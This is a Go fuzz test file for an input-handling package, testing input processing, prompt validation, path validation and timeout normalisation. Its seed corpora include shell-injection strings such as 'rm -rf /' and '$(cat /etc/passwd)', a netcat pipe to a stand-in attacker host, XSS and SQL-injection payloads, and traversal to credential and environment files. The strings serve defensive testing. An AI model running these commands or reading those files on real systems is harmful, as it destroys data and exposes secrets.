// pkg/eos_io/fuzz_test.go

package eos_io

import (
	"context"
	"strings"
	"testing"
	"time"
	"unicode/utf8"
)

// FuzzReadInput tests input reading with various edge cases
func FuzzReadInput(f *testing.F) {
	// Add seed corpus
	seeds := []string{
		"normal input",
		"",
		"   ",
		"\n",
		"\r\n",
		"input with\nnewlines",
		"input with\ttabs",
		"input with\x00nulls",
		strings.Repeat("a", 10000),
		"кириллица",
		"中文输入",
		"input;rm -rf /",
		"input$(whoami)",
		"input`id`",
		"input|nc attacker.com",
		"<script>alert('xss')</script>",
		"' OR '1'='1",
		"${HOME}",
		"$(cat /etc/passwd)",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, input string) {
		// Skip if not valid UTF-8
		if !utf8.ValidString(input) {
			t.Skip("Skipping non-UTF8 input")
		}

		ctx, cancel := context.WithTimeout(context.Background(), 100*time.Millisecond)
		defer cancel()

		_ = &RuntimeContext{
			Ctx: ctx,
		}

		// Test should not panic
		func() {
			defer func() {
				if r := recover(); r != nil {
					t.Fatalf("ReadInput processing panicked with input %q: %v", input, r)
				}
			}()

			// Simulate input processing
			processed := processInput(input)

			// Security checks
			if strings.Contains(processed, "\x00") {
				t.Errorf("Processed input contains null bytes: %q", processed)
			}

			if len(processed) > 4096 {
				t.Errorf("Processed input exceeds maximum length: %d chars", len(processed))
			}
		}()
	})
}

// FuzzPromptValidation tests prompt validation
func FuzzPromptValidation(f *testing.F) {
	// Add seed corpus
	seeds := []string{
		"Enter username",
		"Please enter your password",
		"Confirm action (y/n)",
		"",
		strings.Repeat("a", 1000),
		"Prompt with\nnewlines",
		"Prompt with\x00nulls",
		"Prompt with ANSI \x1b[31mcolor\x1b[0m codes",
		"Prompt with ${HOME} variables",
		"Prompt with $(command) injection",
		"Prompt with `backticks`",
		"Кириллический промпт",
		"中文提示",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, prompt string) {
		// Skip if not valid UTF-8
		if !utf8.ValidString(prompt) {
			t.Skip("Skipping non-UTF8 input")
		}

		// Test should not panic
		func() {
			defer func() {
				if r := recover(); r != nil {
					t.Fatalf("Prompt validation panicked with input %q: %v", prompt, r)
				}
			}()

			// Validate prompt
			isValid := validatePrompt(prompt)

			// Security checks
			if strings.Contains(prompt, "\x00") {
				if isValid {
					t.Errorf("Prompt with null bytes should be rejected: %q", prompt)
				}
			}

			if len(prompt) > 512 {
				if isValid {
					t.Errorf("Excessively long prompt should be rejected: %d chars", len(prompt))
				}
			}

			// Check for ANSI escape sequences
			if strings.Contains(prompt, "\x1b[") {
				t.Logf("Warning: Prompt contains ANSI escape sequences: %q", prompt)
			}
		}()
	})
}

// FuzzPathValidation tests file path validation
func FuzzPathValidation(f *testing.F) {
	// Add seed corpus
	seeds := []string{
		"/home/user/file.txt",
		"./relative/path.txt",
		"../parent/file.txt",
		"/etc/passwd",
		"",
		".",
		"..",
		"...",
		"../../../../etc/passwd",
		"/path/with spaces/file.txt",
		"/path/with\nnewlines/file.txt",
		"/path/with\x00nulls/file.txt",
		"C:\\Windows\\System32",
		"\\\\server\\share\\file.txt",
		"/tmp/" + strings.Repeat("a", 300),
		"~/user/file.txt",
		"$HOME/file.txt",
		"${HOME}/file.txt",
		"/path/;rm -rf /",
		"/path/$(whoami)",
		"/path/`id`",
		"/путь/кириллица.txt",
		"/路径/中文.txt",
		"/dev/null",
		"/proc/self/environ",
		"file://localhost/etc/passwd",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, path string) {
		// Skip if not valid UTF-8
		if !utf8.ValidString(path) {
			t.Skip("Skipping non-UTF8 input")
		}

		// Test should not panic
		func() {
			defer func() {
				if r := recover(); r != nil {
					t.Fatalf("Path validation panicked with input %q: %v", path, r)
				}
			}()

			// Validate path
			isValid := validatePath(path)

			// Security checks
			if strings.Contains(path, "..") && !strings.HasPrefix(path, "...") {
				if isValid {
					t.Errorf("Path traversal attempt should be rejected: %q", path)
				}
			}

			if strings.Contains(path, "\x00") {
				if isValid {
					t.Errorf("Path with null bytes should be rejected: %q", path)
				}
			}

			if strings.Contains(path, "\n") || strings.Contains(path, "\r") {
				if isValid {
					t.Errorf("Path with newlines should be rejected: %q", path)
				}
			}

			// Check for dangerous paths
			dangerousPaths := []string{
				"/etc/passwd",
				"/etc/shadow",
				"/proc/self/environ",
				"/dev/null",
				"/dev/zero",
			}

			for _, dangerous := range dangerousPaths {
				if strings.HasSuffix(path, dangerous) && isValid {
					t.Logf("Warning: Potentially dangerous path accepted: %q", path)
				}
			}
		}()
	})
}

// FuzzTimeoutHandling tests timeout handling with various durations
func FuzzTimeoutHandling(f *testing.F) {
	// Add seed corpus - various timeout values
	seeds := []int64{
		0,
		-1,
		1,
		100,
		1000,
		60000,
		3600000,
		-9223372036854775808, // MinInt64
		9223372036854775807,  // MaxInt64
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, timeoutMs int64) {
		// Test should not panic
		func() {
			defer func() {
				if r := recover(); r != nil {
					t.Fatalf("Timeout handling panicked with input %d: %v", timeoutMs, r)
				}
			}()

			// Create context with timeout
			timeout := normalizeTimeout(timeoutMs)
			
			// Timeout should never be negative (normalized to default)
			if timeout < 0 {
				t.Errorf("Timeout should never be negative, got: %v", timeout)
			}

			// Check normalization behavior
			if timeoutMs <= 0 && timeout != 3*time.Minute {
				t.Errorf("Non-positive input should normalize to 3 minutes, got: %v", timeout)
			}

			if timeout > 24*time.Hour {
				t.Errorf("Excessive timeout should be capped at 24 hours, got: %v", timeout)
			}

			// Create runtime context
			ctx, cancel := context.WithTimeout(context.Background(), timeout)
			defer cancel()

			rc := &RuntimeContext{
				Ctx: ctx,
			}

			// Verify context is valid
			select {
			case <-rc.Ctx.Done():
				if timeout > 0 {
					t.Logf("Context cancelled immediately with timeout: %v", timeout)
				}
			default:
				// Context still active
			}
		}()
	})
}

// Helper functions
func processInput(input string) string {
	// Trim spaces
	input = strings.TrimSpace(input)
	
	// Remove null bytes
	input = strings.ReplaceAll(input, "\x00", "")
	
	// Limit length
	if len(input) > 4096 {
		input = input[:4096]
	}
	
	return input
}

func validatePrompt(prompt string) bool {
	if prompt == "" || len(prompt) > 512 {
		return false
	}
	if strings.Contains(prompt, "\x00") {
		return false
	}
	return true
}

func validatePath(path string) bool {
	if path == "" || len(path) > 4096 {
		return false
	}
	if strings.Contains(path, "\x00") {
		return false
	}
	if strings.Contains(path, "\n") || strings.Contains(path, "\r") {
		return false
	}
	// Check for path traversal
	if strings.Contains(path, "..") && !strings.HasPrefix(path, "...") {
		return false
	}
	return true
}

func normalizeTimeout(ms int64) time.Duration {
	if ms <= 0 {
		return 3 * time.Minute // Default timeout
	}
	
	duration := time.Duration(ms) * time.Millisecond
	
	// Handle overflow cases
	if duration < 0 {
		return 3 * time.Minute // Default for overflow
	}
	
	// Cap at 24 hours
	if duration > 24*time.Hour {
		return 24 * time.Hour
	}
	
	return duration
}